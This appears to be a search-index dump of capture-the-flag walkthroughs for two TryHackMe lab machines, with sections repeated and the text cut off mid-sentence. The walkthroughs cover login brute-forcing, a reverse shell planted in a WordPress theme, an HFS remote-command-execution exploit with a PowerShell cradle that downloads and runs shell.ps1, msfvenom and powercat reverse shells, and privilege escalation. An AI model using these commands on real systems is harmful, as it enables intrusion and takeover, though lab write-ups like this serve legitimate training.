Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.38.89 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 22,80,443 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.38.89 -p22,80,443 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 13:42 +07 Nmap scan report for 10.10.38.89 Host is up (0.23s latency). PORT STATE SERVICE VERSION 22/tcp closed ssh 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). 443/tcp open ssl/http Apache httpd |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after: 2025-09-13T10:45:03 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.96 seconds Apache services 80,443 At home page port 80 and 433, I saw the same page with html and javascript. Using gonuster to list of hidden in the web application [+] Files and directories gobuster dir -k -u http://10.10.38.89:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> /login (Status: 302) [Size: 0] [--> http://10.10.38.89:80/wp-login.php] <snip> /wp-content (Status: 301) [Size: 238] [--> http://10.10.38.89/wp-content/] <snip> /dashboard (Status: 302) [Size: 0] [--> http://10.10.38.89:80/wp-admin/] I saw the web application using wordpress, let's go to wp-amdin page and enum more. I try to login with some default credential, but it's all fail. But I got the server response Invalid username this will confirm when I input the correct username or not. Using wpscan to enum vulnerable, theme and plugin in the server. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.7:31.3]~ \u2514\u2500$ wpscan --url http://10.10.38.89 --enumerate vpt <snip> [+] Headers | Interesting Entries: | - Server: Apache | - X-Mod-Pagespeed: 1.9.32.3-4523 | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://10.10.38.89/robots.txt | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% <snip> When I checking file robots.txt I saw file fsocity.dic . Poc code here \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.7:33.3]~ \u2514\u2500$ curl http://10.10.38.89/robots.txt User-agent: * fsocity.dic key-1-of-3.txt Go to file fsocity.dic , It seem like a directory, may I can use it to brute force wp-admin password. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:34.4]~ \u2514\u2500$ curl http://10.10.38.89/fsocity.dic true false wikia from the now Wikia extensions <snip> Foothold Brute force WP-Admin Poc code here At Inspect Element of Fire Fox, I can get the Request Payload for hydra to brute force. log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.38.89%2Fwp-admin%2F&testcookie=1 First, based on server's response, I brute force wp-admin's username with hydra and fsocity.dic directory. The username is Elliot . \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.5:35.2]~/walkthrough/tryhackme/mrrobot \u2514\u2500$ hydra -L fsocity.dic -p admin 10.10.38.89 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.38.89%2Fwp-admin%2F&testcookie=1:Invalid username' -I -t 64 <snip> [DATA] attacking http-post-form://10.10.38.89:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.38.89%2Fwp-admin%2F&testcookie=1:Invalid username [80][http-post-form] host: 10.10.38.89 login: Elliot password: admin <snip> Second, with username Elliot I brute force password with the same method. The password is ER28-0652 . \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.7:33.2]~/walkthrough/tryhackme/mrrobot \u2514\u2500$ hydra -l Elliot -P fsocity.dic 10.10.38.89 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.38.89%2Fwp-admin%2F&testcookie=1:The password you entered for the username' -I -t 64 <snip> [80][http-post-form] host: 10.10.38.89 login: Elliot password: ER28-0652 1 of 1 target successfully completed, 1 valid password found <snip> Login to wp-admin successfully using knowed credential. PHP ReverseShell Poc code here At page 404 Template file 404.php , I change the code in file to php reverse shell code. http://10.10.38.89/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen Go to some directory not exist in wp application to load page 404.php . \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.7:31.9]~/walkthrough/tryhackme/mrrobot \u2514\u2500$ curl http://10.10.38.89/shell At the listener, I got reverse shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.7:31.2]~/walkthrough/tryhackme/mrrobot \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.38.89] 59188 Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux 08:01:35 up 1:23, 0 users, load average: 0.00, 0.14, 0.35 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1(daemon) gid=1(daemon) groups=1(daemon) /bin/sh: 0: can't access tty; job control turned off $ id uid=1(daemon) gid=1(daemon) groups=1(daemon) Privilege Escalation MD5 Hash Cracking Poc code here At folder home, I saw that the user in the system is robot , in the home folder, there is file password.raw-md5 . daemon@linux:/$ ls /home robot daemon@linux:/$ ls /home/robot/ key-2-of-3.txt password.raw-md5 daemon@linux:/home/robot$ cat password.raw-md5 robot:c3fcd3d76192e4007dfb496cca67e13b File password.raw-md5 is the md5 hash password for user robot . Let's crack it. At https://md5.gromweb.com/?md5=c3fcd3d76192e4007dfb496cca67e13b reversed the hash to string abcdefghijklmnopqrstuvwxyz . Using knowed password, I successfully login to robot account. robot:c3fcd3d76192e4007dfb496cca67e13b daemon@linux:/home/robot$ su robot Password: robot@linux:~$ id uid=1002(robot) gid=1002(robot) groups=1002(robot) Binaries That AutoElevate After local enum, I find nmap have suid can run as the owner and the owner is root . robot@linux:/tmp$ find / -perm -u=s -type f 2>/dev/null <snip> /usr/local/bin/nmap <snip> Run nmap in interactive mode and get the root shell. robot@linux:/tmp$ /usr/local/bin/nmap --interactive Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h <enter> for help nmap> !/bin/sh # whoami root","title":"Mr Robot"},{"location":"walkthrough/tryhackme/MrRobot/index.html#tryhackme-mr-robot","text":"Author: Hades Scripting here","title":"TryHackMe Mr Robot"},{"location":"walkthrough/tryhackme/MrRobot/index.html#vm-details","text":"Name Mr Robot Credit to Leon Johnson Created by ben Date release 864 days old (9/4/2021)","title":"VM Details"},{"location":"walkthrough/tryhackme/MrRobot/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/tryhackme/MrRobot/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.38.89 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 22,80,443 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.38.89 -p22,80,443 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 13:42 +07 Nmap scan report for 10.10.38.89 Host is up (0.23s latency). PORT STATE SERVICE VERSION 22/tcp closed ssh 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). 443/tcp open ssl/http Apache httpd |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after: 2025-09-13T10:45:03 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 24.96 seconds","title":"Openning Services"},{"location":"walkthrough/tryhackme/MrRobot/index.html#apache-services-80443","text":"At home page port 80 and 433, I saw the same page with html and javascript. Using gonuster to list of hidden in the web application [+] Files and directories gobuster dir -k -u http://10.10.38.89:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> /login (Status: 302) [Size: 0] [--> http://10.10.38.89:80/wp-login.php] <snip> /wp-content (Status: 301) [Size: 238] [--> http://10.10.38.89/wp-content/] <snip> /dashboard (Status: 302) [Size: 0] [--> http://10.10.38.89:80/wp-admin/] I saw the web application using wordpress, let's go to wp-amdin page and enum more. I try to login with some default credential, but it's all fail. But I got the server response Invalid username this will confirm when I input the correct username or not. Using wpscan to enum vulnerable, theme and plugin in the server. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.7:31.3]~ \u2514\u2500$ wpscan --url http://10.10.38.89 --enumerate vpt <snip> [+] Headers | Interesting Entries: | - Server: Apache | - X-Mod-Pagespeed: 1.9.32.3-4523 | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://10.10.38.89/robots.txt | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% <snip> When I checking file robots.txt I saw file fsocity.dic . Poc code here \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.7:33.3]~ \u2514\u2500$ curl http://10.10.38.89/robots.txt User-agent: * fsocity.dic key-1-of-3.txt Go to file fsocity.dic , It seem like a directory, may I can use it to brute force wp-admin password. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:34.4]~ \u2514\u2500$ curl http://10.10.38.89/fsocity.dic true false wikia from the now Wikia extensions <snip>","title":"Apache services 80,443"},{"location":"walkthrough/tryhackme/MrRobot/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/tryhackme/MrRobot/index.html#brute-force-wp-admin","text":"Poc code here At Inspect Element of Fire Fox, I can get the Request Payload for hydra to brute force. log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.38.89%2Fwp-admin%2F&testcookie=1 First, based on server's response, I brute force wp-admin's username with hydra and fsocity.dic directory. The username is Elliot . \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.5:35.2]~/walkthrough/tryhackme/mrrobot \u2514\u2500$ hydra -L fsocity.dic -p admin 10.10.38.89 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.38.89%2Fwp-admin%2F&testcookie=1:Invalid username' -I -t 64 <snip> [DATA] attacking http-post-form://10.10.38.89:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.38.89%2Fwp-admin%2F&testcookie=1:Invalid username [80][http-post-form] host: 10.10.38.89 login: Elliot password: admin <snip> Second, with username Elliot I brute force password with the same method. The password is ER28-0652 . \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.7:33.2]~/walkthrough/tryhackme/mrrobot \u2514\u2500$ hydra -l Elliot -P fsocity.dic 10.10.38.89 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.38.89%2Fwp-admin%2F&testcookie=1:The password you entered for the username' -I -t 64 <snip> [80][http-post-form] host: 10.10.38.89 login: Elliot password: ER28-0652 1 of 1 target successfully completed, 1 valid password found <snip> Login to wp-admin successfully using knowed credential.","title":"Brute force WP-Admin"},{"location":"walkthrough/tryhackme/MrRobot/index.html#php-reverseshell","text":"Poc code here At page 404 Template file 404.php , I change the code in file to php reverse shell code. http://10.10.38.89/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen Go to some directory not exist in wp application to load page 404.php . \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.7:31.9]~/walkthrough/tryhackme/mrrobot \u2514\u2500$ curl http://10.10.38.89/shell At the listener, I got reverse shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.7:31.2]~/walkthrough/tryhackme/mrrobot \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.38.89] 59188 Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux 08:01:35 up 1:23, 0 users, load average: 0.00, 0.14, 0.35 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1(daemon) gid=1(daemon) groups=1(daemon) /bin/sh: 0: can't access tty; job control turned off $ id uid=1(daemon) gid=1(daemon) groups=1(daemon)","title":"PHP ReverseShell"},{"location":"walkthrough/tryhackme/MrRobot/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/tryhackme/MrRobot/index.html#md5-hash-cracking","text":"Poc code here At folder home, I saw that the user in the system is robot , in the home folder, there is file password.raw-md5 . daemon@linux:/$ ls /home robot daemon@linux:/$ ls /home/robot/ key-2-of-3.txt password.raw-md5 daemon@linux:/home/robot$ cat password.raw-md5 robot:c3fcd3d76192e4007dfb496cca67e13b File password.raw-md5 is the md5 hash password for user robot . Let's crack it. At https://md5.gromweb.com/?md5=c3fcd3d76192e4007dfb496cca67e13b reversed the hash to string abcdefghijklmnopqrstuvwxyz . Using knowed password, I successfully login to robot account. robot:c3fcd3d76192e4007dfb496cca67e13b daemon@linux:/home/robot$ su robot Password: robot@linux:~$ id uid=1002(robot) gid=1002(robot) groups=1002(robot)","title":"MD5 Hash Cracking"},{"location":"walkthrough/tryhackme/MrRobot/index.html#binaries-that-autoelevate","text":"After local enum, I find nmap have suid can run as the owner and the owner is root . robot@linux:/tmp$ find / -perm -u=s -type f 2>/dev/null <snip> /usr/local/bin/nmap <snip> Run nmap in interactive mode and get the root shell. robot@linux:/tmp$ /usr/local/bin/nmap --interactive Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h <enter> for help nmap> !/bin/sh # whoami root","title":"Binaries That AutoElevate"},{"location":"walkthrough/tryhackme/SteelMountain/index.html","text":"TryHackMe Steel Mountain Author: Hades Scripting here VM Details Name Steel Mountain Created by tryhackme Date release 547 days old (/4/2021) Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.106.253 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49163,49164 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.106.253 -p80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49163,49164 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 07:46 +07 Nmap scan report for 10.10.106.253 Host is up (0.24s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/8.5 |_http-title: Site doesn't have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 3389/tcp open ssl/ms-wbt-server? | ssl-cert: Subject: commonName=steelmountain | Not valid before: 2021-04-11T00:42:38 |_Not valid after: 2021-10-11T00:42:38 |_ssl-date: 2021-04-12T00:48:03+00:00; -1s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8080/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49163/tcp open msrpc Microsoft Windows RPC 49164/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1s, deviation: 0s, median: -1s |_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:6d:24:59:57:b7 (unknown) | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-12T00:47:57 |_ start_date: 2021-04-12T00:42:31 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 74.47 seconds Microsoft IIS httpd 8.5 Port 80 is web page showing image of Employee of the month . List of the hidden in web application port 80 [+] Files and directories gobuster dir -k -u http://10.10.106.253:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> /img (Status: 301) [Size: 151] [--> http://10.10.106.253:80/img/] Access denied when I go to uri '/img' HttpFileServer httpd 2.3 8080 At port 8080, Service HttpFileServer httpd 2.3 is running. Try to find public exploit for this service. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.9:27.7]~ \u2514\u2500$ searchsploit HttpFileServer 2.3 ------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------- --------------------------------- Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) | windows/webapps/49125.py ------------------------------------------------------------- --------------------------------- Shellcodes: No Results Server Message Block In SMB service, using smbmap and smbclient to enum, but cannot authentication. ### SMB Enumeration (445) ############################ smbmap -H 10.10.106.253 -u guest [!] Authentication error on 10.10.106.253 smbclient -L 10.10.106.253 session setup failed: NT_STATUS_ACCESS_DENIED Foothold Rejetto HttpFileServer RCE Poc code here Using powercat to create file shell.ps1 PS <snip> cp /home/kali/payloads/tools/powercat.ps1 . PS <snip> . ./powercat.ps1 PS <snip> powercat -c 10.11.32.198 -p 443 -e cmd.exe -g > shell.ps1 Open httpserver in kali machine using python3 \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.9:26.8]~/walkthrough/tryhackme/steelmountain \u2514\u2500$ sudo python3 -m http.server 80 [sudo] password for kali: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.232.100 - - [10/Apr/2021 01:07:07] \"GET /shell.ps1 HTTP/1.1\" 200 - Execute file 49125.py to download and run file shell.ps1 \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.9:27.2]~/walkthrough/tryhackme/steelmountain \u2514\u2500$ cmd=\"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.32.198/shell.ps1')\" \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.9:27.2]~/walkthrough/tryhackme/steelmountain \u2514\u2500$ python3 49125.py 10.10.232.100 8080 \"$cmd\" http://10.10.232.100:8080/?search=%00{.+exec|powershell.exe%20IEX%20%28New-Object%20System.Net.WebClient%29.DownloadString%28%27http%3A//10.11.32.198/shell.ps1%27%29.} At the listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.9:27.3]~ \u2514\u2500$ sudo nc -nvlp 443 [sudo] password for kali: listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.232.100] 49346 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup>whoami whoami steelmountain\\bill Reverse using powershell encode Poc code here Create ecoded powershell payload and copy it to clipboard \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.1:22.3]~/walkthrough/tryhackme/steelmountain \u2514\u2500$ cat pwsh.ps1 | iconv -t UTF-16LE | base64 -w 0 | cs Sent and execute payload \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.1:21.6]~/walkthrough/tryhackme/steelmountain \u2514\u2500$ python3 49125.py 10.10.106.253 8080 \"powershell -enc $(vs)\" > /dev/null At listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.1:21.9]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.106.253] 49467 PS C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup> whoami steelmountain\\bill Privilege Escalation Local Enumeration Poc code here After enum local machine, I saw that the application IObit has been installed. PS C:\\Program Files (x86)> dir | GET-ACL <snip> IObit BUILTIN\\Administrators STEELMOUNTAIN\\bill Allow Write, Rea... <snip> Search public exploit for IObit with searchsploit. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.8:26.8]~ \u2514\u2500$ searchsploit IObit ------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------- --------------------------------- IObit Advanced SystemCare 10.0.2 - Unquoted Service Path Pri | windows/local/40577.txt <snip> ------------------------------------------------------------- --------------------------------- Shellcodes: No Results Based on exploit windows/local/40577.txt and folder IObit with permission STEELMOUNTAIN\\bill Allow Write, Rea... , I can go to system privilege by create file name to break space when IObit application start. PS C:\\Program Files (x86)> dir IObit <snip> d---- 4/11/2021 5:43 PM Advanced SystemCare d---- 9/26/2019 10:35 PM IObit Uninstaller d---- 9/26/2019 8:18 AM LiveUpdate Checking service running in the system PS C:\\Program Files (x86)> get-service Status Name DisplayName ------ ---- ----------- Running AdvancedSystemC... Advanced SystemCare Service 9 <snip> Testing restart service Advanced SystemCare Service 9 PS C:\\> cmd /c sc stop AdvancedSystemCareService9 SERVICE_NAME: AdvancedSystemCareService9 TYPE : 110 WIN32_OWN_PROCESS (interactive) STATE : 4 RUNNING (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 PS C:\\> cmd /c sc start AdvancedSystemCareService9 SERVICE_NAME: AdvancedSystemCareService9 TYPE : 110 WIN32_OWN_PROCESS (interactive) STATE : 2 START_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x7d0 PID : 2272 FLAGS : Unquoted Service Path Create file reverse shell Advanced.exe with msfvenom \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[0.7:21.4]~ \u2514\u2500$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.32.198 LPORT=443 -f exe -o Advanced.exe Download file Advanced.exe to folder IObit in windows machine. PS C:\\Program Files (x86)\\IObit> powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.11.32.198/Advanced.exe','C:/Program Files (x86)/IObit/Advanced.exe')\" PS C:\\Program Files (x86)\\IObit> dir Directory: C:\\Program Files (x86)\\IObit Mode LastWriteTime Length Name ---- ------------- ------ ---- d---- 4/11/2021 7:25 PM Advanced SystemCare d---- 9/26/2019 10:35 PM IObit Uninstaller d---- 9/26/2019 8:18 AM LiveUpdate -a--- 4/11/2021 7:30 PM 73802 Advanced.exe Restart service Advanced SystemCare Service 9 and at the listener, I got system shell. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[0.7:21.6]~/walkthrough/tryhackme/steelmountain \u2514\u2500$ sudo nc -nvlp 443 connect to [10.11.32.198] from (UNKNOWN) [10.10.106.253] 49874 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami nt authority\\system","title":"Steel Mountain"},{"location":"walkthrough/tryhackme/SteelMountain/index.html#tryhackme-steel-mountain","text":"Author: Hades Scripting here","title":"TryHackMe Steel Mountain"},{"location":"walkthrough/tryhackme/SteelMountain/index.html#vm-details","text":"Name Steel Mountain Created by tryhackme Date release 547 days old (/4/2021)","title":"VM Details"},{"location":"walkthrough/tryhackme/SteelMountain/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/tryhackme/SteelMountain/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.106.253 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49163,49164 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.106.253 -p80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49163,49164 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 07:46 +07 Nmap scan report for 10.10.106.253 Host is up (0.24s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/8.5 |_http-title: Site doesn't have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 3389/tcp open ssl/ms-wbt-server? | ssl-cert: Subject: commonName=steelmountain | Not valid before: 2021-04-11T00:42:38 |_Not valid after: 2021-10-11T00:42:38 |_ssl-date: 2021-04-12T00:48:03+00:00; -1s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8080/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49163/tcp open msrpc Microsoft Windows RPC 49164/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1s, deviation: 0s, median: -1s |_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:6d:24:59:57:b7 (unknown) | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-12T00:47:57 |_ start_date: 2021-04-12T00:42:31 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 74.47 seconds","title":"Openning Services"},{"location":"walkthrough/tryhackme/SteelMountain/index.html#microsoft-iis-httpd-85","text":"Port 80 is web page showing image of Employee of the month . List of the hidden in web application port 80 [+] Files and directories gobuster dir -k -u http://10.10.106.253:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <snip> /img (Status: 301) [Size: 151] [--> http://10.10.106.253:80/img/] Access denied when I go to uri '/img'","title":"Microsoft IIS httpd 8.5"},{"location":"walkthrough/tryhackme/SteelMountain/index.html#httpfileserver-httpd-23-8080","text":"At port 8080, Service HttpFileServer httpd 2.3 is running. Try to find public exploit for this service. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.9:27.7]~ \u2514\u2500$ searchsploit HttpFileServer 2.3 ------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------- --------------------------------- Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) | windows/webapps/49125.py ------------------------------------------------------------- --------------------------------- Shellcodes: No Results","title":"HttpFileServer httpd 2.3 8080"},{"location":"walkthrough/tryhackme/SteelMountain/index.html#server-message-block","text":"In SMB service, using smbmap and smbclient to enum, but cannot authentication. ### SMB Enumeration (445) ############################ smbmap -H 10.10.106.253 -u guest [!] Authentication error on 10.10.106.253 smbclient -L 10.10.106.253 session setup failed: NT_STATUS_ACCESS_DENIED","title":"Server Message Block"},{"location":"walkthrough/tryhackme/SteelMountain/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/tryhackme/SteelMountain/index.html#rejetto-httpfileserver-rce","text":"Poc code here Using powercat to create file shell.ps1 PS <snip> cp /home/kali/payloads/tools/powercat.ps1 . PS <snip> . ./powercat.ps1 PS <snip> powercat -c 10.11.32.198 -p 443 -e cmd.exe -g > shell.ps1 Open httpserver in kali machine using python3 \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.9:26.8]~/walkthrough/tryhackme/steelmountain \u2514\u2500$ sudo python3 -m http.server 80 [sudo] password for kali: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.232.100 - - [10/Apr/2021 01:07:07] \"GET /shell.ps1 HTTP/1.1\" 200 - Execute file 49125.py to download and run file shell.ps1 \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.9:27.2]~/walkthrough/tryhackme/steelmountain \u2514\u2500$ cmd=\"powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.32.198/shell.ps1')\" \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.9:27.2]~/walkthrough/tryhackme/steelmountain \u2514\u2500$ python3 49125.py 10.10.232.100 8080 \"$cmd\" http://10.10.232.100:8080/?search=%00{.+exec|powershell.exe%20IEX%20%28New-Object%20System.Net.WebClient%29.DownloadString%28%27http%3A//10.11.32.198/shell.ps1%27%29.} At the listener, I have reverse shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[1.9:27.3]~ \u2514\u2500$ sudo nc -nvlp 443 [sudo] password for kali: listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.232.100] 49346 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup>whoami whoami steelmountain\\bill Reverse using powershell encode Poc code here Create ecoded powershell payload and copy it to 